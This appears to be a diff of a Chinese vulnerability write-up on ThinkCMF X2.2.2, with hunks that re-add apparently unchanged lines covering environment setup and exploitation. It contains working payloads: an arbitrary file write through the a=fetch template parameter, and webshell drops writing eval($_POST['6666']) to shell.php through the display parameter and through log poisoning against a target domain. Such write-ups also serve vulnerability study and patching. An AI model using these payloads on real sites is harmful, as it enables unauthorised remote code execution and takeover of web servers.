@@ -30,7 +30,7 @@ ThinkCMF X2.2.2
 
 **环境搭建**
 
-ThinkCMFX2.2.2 下载链接：https://pan.baidu.com/s/1rK1-_BLmH1VPXsIUfr1VUw 提取码：wuhw
+ThinkCMFX2.2.2 下载链接：https://pan.baidu.com/s/1rK1-_BLmH1VPXsIUfr1VUw 提取码：wuhw
 
 将下载好的 ThinkCMF 解压后放在 WWW 目录下，然后浏览器访问即可看到安装页面
 
@@ -86,7 +86,7 @@ parseTemplate() 方法作用：判断模板主题是否存在，当模板主题�
 2. 通过构造 a 参数的 fetch() 方法，在不需要知道文件路径的情况下就可以实现任意文件写入
 
 ```
-?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('1.php','<?php phpinfo(); ?>')</php>
+?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('1.php','<?php phpinfo(); ?>')</php>
 ```
 
 执行 paylaod，如果页面是空白的，则说明可能写入成功
@@ -100,7 +100,7 @@ parseTemplate() 方法作用：判断模板主题是否存在，当模板主题�
 **ThinkCMF 缓存 getshell**
 
 ```
-?a=display&templateFile=<?php file_put_contents('shell.php','<?php+eval($_POST["6666"]);?>');die();?>
+?a=display&templateFile=<?php file_put_contents('shell.php','<?php+eval($_POST["6666"]);?>');die();?>
 ```
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDoRaBBTEIiaic32eduibVPcPmmfaTI11vNPP9pZnvLV2g9zpz3sPmmTTmAhQhDwCfxxhAHLJtw6asNw/640?wx_fmt=png)
@@ -118,7 +118,7 @@ http://target.domain/?a=display&templateFile=data/runtime/Logs/Portal/YY_MM_DD.l
 发送请求，thinkphp 生成的日志的格式为 年 - 月份 - 日期 (请求的日期)  
 
 ```
-http://target.domain/?a=display&templateFile=<?php eval($_POST["6666"]);?>
+http://target.domain/?a=display&templateFile=<?php eval($_POST["6666"]);?>
 ```
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDDoRaBBTEIiaic32eduibVPcPmAoMcfoNEoCyEeiapC9ePttFMiaxdBuh37pfSOyWGS00Dj2r8NRoRP0uw/640?wx_fmt=png)
